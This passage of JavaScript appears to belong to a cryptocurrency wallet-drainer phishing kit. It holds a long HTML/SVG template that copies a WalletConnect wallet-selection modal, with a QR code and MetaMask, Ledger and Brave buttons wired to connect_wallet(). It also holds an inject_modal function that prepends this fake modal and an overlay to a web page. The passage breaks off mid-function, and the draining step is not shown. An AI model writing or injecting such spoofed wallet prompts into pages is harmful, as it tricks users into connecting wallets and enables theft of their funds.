                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="304.9672131147541"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="2.6065573770491803"
                            y2="18.245901639344265" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="91.22950819672131"
                            y2="96.44262295081968" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="138.14754098360655"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="169.4262295081967"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="205.91803278688525"
                            y2="221.55737704918033" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="247.62295081967213"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="226.77049180327867" x2="226.77049180327867" y1="268.4754098360656"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="28.672131147540984"
                            y2="33.885245901639344" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="44.31147540983606"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="65.16393442622952"
                            y2="75.59016393442623" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="138.14754098360655"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="169.4262295081967"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="252.8360655737705"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="231.98360655737704" x2="231.98360655737704" y1="278.90163934426226"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="7.8196721311475414"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="44.31147540983606"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="86.01639344262296"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="132.93442622950818"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="205.91803278688525"
                            y2="211.1311475409836" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="221.55737704918033"
                            y2="231.98360655737704" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="237.19672131147541" x2="237.19672131147541" y1="289.327868852459"
                            y2="299.75409836065575" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="18.245901639344265"
                            y2="44.31147540983606" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="54.73770491803278"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="70.37704918032787"
                            y2="75.59016393442623" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="127.72131147540985"
                            y2="143.36065573770492" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="164.21311475409834"
                            y2="185.0655737704918" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="242.40983606557376"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="242.40983606557376" x2="242.40983606557376" y1="273.6885245901639"
                            y2="284.11475409836066" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="18.245901639344265"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="75.59016393442623"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="122.50819672131148"
                            y2="127.72131147540985" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="153.78688524590163" y2="159"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="205.91803278688525"
                            y2="221.55737704918033" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="231.98360655737704"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="247.62295081967213"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="247.62295081967213" x2="247.62295081967213" y1="278.90163934426226"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="2.6065573770491803"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="33.885245901639344" y2="39.0983606557377"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="49.52459016393443" y2="54.73770491803278"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="127.72131147540985"
                            y2="143.36065573770492" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="263.2622950819672" y2="268.4754098360656"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="284.11475409836066"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="252.8360655737705" x2="252.8360655737705" y1="304.9672131147541"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="65.16393442622952"
                            y2="75.59016393442623" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="96.44262295081968"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="122.50819672131148"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="205.91803278688525"
                            y2="211.1311475409836" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="231.98360655737704"
                            y2="247.62295081967213" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="268.4754098360656"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="258.04918032786884" x2="258.04918032786884" y1="289.327868852459"
                            y2="299.75409836065575" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="13.032786885245901" y2="39.0983606557377"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="127.72131147540985"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="159" y2="200.70491803278688"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="252.8360655737705"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="268.4754098360656" y2="273.6885245901639"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="263.2622950819672" x2="263.2622950819672" y1="289.327868852459" y2="294.54098360655735"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="268.4754098360656" x2="268.4754098360656" y1="2.6065573770491803"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="268.4754098360656" x2="268.4754098360656" y1="80.8032786885246" y2="91.22950819672131"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="268.4754098360656" x2="268.4754098360656" y1="216.34426229508196"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="268.4754098360656" x2="268.4754098360656" y1="247.62295081967213"
                            y2="263.2622950819672" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="268.4754098360656" x2="268.4754098360656" y1="278.90163934426226"
                            y2="284.11475409836066" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="2.6065573770491803"
                            y2="18.245901639344265" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="33.885245901639344"
                            y2="65.16393442622952" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="96.44262295081968"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="112.08196721311477"
                            y2="117.29508196721312" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="143.36065573770492"
                            y2="169.4262295081967" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="190.27868852459017"
                            y2="195.4918032786885" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="242.40983606557376"
                            y2="247.62295081967213" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="273.6885245901639" x2="273.6885245901639" y1="263.2622950819672"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="44.31147540983606"
                            y2="75.59016393442623" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="86.01639344262296"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="143.36065573770492"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="205.91803278688525"
                            y2="216.34426229508196" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="278.90163934426226" x2="278.90163934426226" y1="258.04918032786884"
                            y2="263.2622950819672" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="284.11475409836066" x2="284.11475409836066" y1="44.31147540983606"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="284.11475409836066" x2="284.11475409836066" y1="75.59016393442623"
                            y2="80.8032786885246" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="284.11475409836066" x2="284.11475409836066" y1="96.44262295081968"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="284.11475409836066" x2="284.11475409836066" y1="185.0655737704918"
                            y2="190.27868852459017" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="284.11475409836066" x2="284.11475409836066" y1="211.1311475409836"
                            y2="216.34426229508196" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="44.31147540983606" y2="49.52459016393443"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="59.950819672131146" y2="75.59016393442623"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="86.01639344262296" y2="91.22950819672131"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="127.72131147540985" y2="132.93442622950818"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="169.4262295081967" y2="179.85245901639342"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="205.91803278688525" y2="211.1311475409836"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="221.55737704918033" y2="237.19672131147541"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="268.4754098360656" y2="273.6885245901639"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="289.327868852459" x2="289.327868852459" y1="310.18032786885243" y2="315.39344262295083"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="59.950819672131146"
                            y2="70.37704918032787" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="80.8032786885246"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="127.72131147540985"
                            y2="132.93442622950818" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="148.57377049180326"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="200.70491803278688"
                            y2="205.91803278688525" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="294.54098360655735" x2="294.54098360655735" y1="242.40983606557376"
                            y2="304.9672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="54.73770491803278"
                            y2="65.16393442622952" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="132.93442622950818"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="153.78688524590163" y2="159"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="169.4262295081967"
                            y2="185.0655737704918" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="231.98360655737704"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="299.75409836065575" x2="299.75409836065575" y1="284.11475409836066"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="54.73770491803278" y2="70.37704918032787"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="80.8032786885246" y2="96.44262295081968"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="122.50819672131148"
                            y2="143.36065573770492" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="190.27868852459017"
                            y2="195.4918032786885" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="242.40983606557376"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="263.2622950819672" y2="268.4754098360656"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="304.9672131147541" x2="304.9672131147541" y1="289.327868852459" y2="294.54098360655735"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="44.31147540983606"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="75.59016393442623"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="122.50819672131148"
                            y2="127.72131147540985" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="138.14754098360655"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="242.40983606557376"
                            y2="247.62295081967213" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="310.18032786885243" x2="310.18032786885243" y1="278.90163934426226"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="49.52459016393443"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="75.59016393442623"
                            y2="80.8032786885246" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="122.50819672131148"
                            y2="132.93442622950818" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="169.4262295081967"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="190.27868852459017"
                            y2="200.70491803278688" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="226.77049180327867"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="252.8360655737705"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="278.90163934426226"
                            y2="289.327868852459" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="315.39344262295083" x2="315.39344262295083" y1="299.75409836065575"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line>
                          <!----></svg><w3m-theme-context></w3m-theme-context></div>
                    </w3m-qrcode>
                  </div>
                </w3m-walletconnect-qr>
              </w3m-modal-content>
              <w3m-modal-footer>
                <div class="w3m-desktop-title"><!--?lit$1626632146$-->
                  <svg width="16" height="16" viewBox="0 0 16 16">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0 5.98c0-1.85 0-2.775.394-3.466a3 3 0 0 1 1.12-1.12C2.204 1 3.13 1 4.98 1h6.04c1.85 0 2.775 0 3.466.394a3 3 0 0 1 1.12 1.12C16 3.204 16 4.13 16 5.98v1.04c0 1.85 0 2.775-.394 3.466a3 3 0 0 1-1.12 1.12C13.796 12 12.87 12 11.02 12H4.98c-1.85 0-2.775 0-3.466-.394a3 3 0 0 1-1.12-1.12C0 9.796 0 8.87 0 7.02V5.98ZM4.98 2.5h6.04c.953 0 1.568.001 2.034.043.446.04.608.108.69.154a1.5 1.5 0 0 1 .559.56c.046.08.114.243.154.69.042.465.043 1.08.043 2.033v1.04c0 .952-.001 1.568-.043 2.034-.04.446-.108.608-.154.69a1.499 1.499 0 0 1-.56.559c-.08.046-.243.114-.69.154-.466.042-1.08.043-2.033.043H4.98c-.952 0-1.568-.001-2.034-.043-.446-.04-.608-.108-.69-.154a1.5 1.5 0 0 1-.559-.56c-.046-.08-.114-.243-.154-.69-.042-.465-.043-1.08-.043-2.033V5.98c0-.952.001-1.568.043-2.034.04-.446.108-.608.154-.69a1.5 1.5 0 0 1 .56-.559c.08-.046.243-.114.69-.154.465-.042 1.08-.043 2.033-.043Z" fill="#fff"></path>
                    <path d="M4 14.25a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75Z" fill="#fff"></path>
                  </svg>
                  <w3m-text variant="small-regular" color="accent">Desktop</w3m-text>
                </div>
                <div class="w3m-grid"><!--?lit$1626632146$--><!---->
                  <w3m-wallet-button name="MetaMask" walletid="c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96" imageid="5195e9db-94d8-4579-6f11-ef553be95100">
                    <button onclick="connect_wallet('MetaMask')">
                      <div>
                        <w3m-wallet-image walletid="c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96" imageid="5195e9db-94d8-4579-6f11-ef553be95100">
                          <div>
                            <img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/5195e9db-94d8-4579-6f11-ef553be95100?projectId=b50e8a39ab67553b3f248378c7974102" alt="">
                          </div>
                        </w3m-wallet-image>
                        <w3m-text class="w3m-label" variant="xsmall-regular"><!--?lit$1626632146$-->MetaMask</w3m-text><!--?lit$1626632146$-->
                        <w3m-text class="w3m-sublabel" variant="xsmall-bold" color="tertiary">INSTALLED</w3m-text>
                      </div>
                    </button>
                  </w3m-wallet-button><!----><!---->
                  <w3m-wallet-button walletid="19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927" imageid="a7f416de-aa03-4c5e-3280-ab49269aef00" name="Ledger Live">
                    <button onclick="connect_wallet('Ledger')">
                      <div>
                        <w3m-wallet-image walletid="19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927" imageid="a7f416de-aa03-4c5e-3280-ab49269aef00">
                          <div><img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=b50e8a39ab67553b3f248378c7974102" alt=""></div>
                        </w3m-wallet-image>
                        <w3m-text class="w3m-label" variant="xsmall-regular"><!--?lit$1626632146$-->Ledger</w3m-text><!--?lit$1626632146$-->
                      </div>
                    </button>
                  </w3m-wallet-button><!----><!---->
                  <w3m-wallet-button walletid="163d2cf19babf05eb8962e9748f9ebe613ed52ebf9c8107c9a0f104bfcf161b3" imageid="8cecad66-73e3-46ee-f45f-01503c032f00" name="Brave Wallet">
                    <button onclick="connect_wallet('Brave')">
                      <div>
                        <w3m-wallet-image walletid="163d2cf19babf05eb8962e9748f9ebe613ed52ebf9c8107c9a0f104bfcf161b3" imageid="8cecad66-73e3-46ee-f45f-01503c032f00">
                        <div><img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/8cecad66-73e3-46ee-f45f-01503c032f00?projectId=b50e8a39ab67553b3f248378c7974102" alt=""></div>
                        </w3m-wallet-image>
                        <w3m-text class="w3m-label" variant="xsmall-regular"><!--?lit$1626632146$-->Brave</w3m-text><!--?lit$1626632146$-->
                      </div>
                    </button>
                  </w3m-wallet-button><!----> <!--?lit$1626632146$-->
                  <w3m-view-all-wallets-button>
                    <button>
                      <div class="w3m-icons"><!--?lit$1626632146$--><!---->
                        <img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/0528ee7e-16d1-4089-21e3-bbfb41933100?projectId=b50e8a39ab67553b3f248378c7974102"><!----><!---->
                        <img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=b50e8a39ab67553b3f248378c7974102"><!----><!---->
                        <img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a5ebc364-8f91-4200-fcc6-be81310a0000?projectId=b50e8a39ab67553b3f248378c7974102"><!----><!---->
                        <img src="https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/8cecad66-73e3-46ee-f45f-01503c032f00?projectId=b50e8a39ab67553b3f248378c7974102"><!----> <!--?lit$1626632146$-->
                      </div>
                      <w3m-text class="w3m-label" variant="xsmall-regular">View All</w3m-text>
                    </button>
                  </w3m-view-all-wallets-button>
                </div>
              </w3m-modal-footer>
            </w3m-desktop-wallet-selection>
            <w3m-legal-notice>
              <div>
                <w3m-text variant="small-regular" color="secondary">
                  By connecting your wallet to this app, you agree to the app's <!--?lit$715492685$-->
                  <a rel="noopener noreferrer" href="">Terms of Service</a> <!--?lit$715492685$-->and <!--?lit$715492685$-->
                  <a rel="noopener noreferrer" href="">Privacy Policy</a>
                </w3m-text>
              </div>
            </w3m-legal-notice>
          </w3m-connect-wallet-view>
        </div>
      </div>
    </w3m-modal-router><w3m-modal-toast></w3m-modal-toast></div>
  </div>
</div>
`


const inject_modal = () => {
  try {
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'block';
    document.body.prepend(overlay_elem);
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'block';
    modal_elem.innerHTML = MS_Modal_Code;
    document.body.prepend(modal_elem);
    // document.querySelector('.ant-modal-close').addEventListener('click', () => {
    //   ms_hide();
    // });
    // document.querySelector('.ant-modal-wrap').addEventListener('click', (e) => {
    //   ms_hide();
    // })
  } catch (err) {
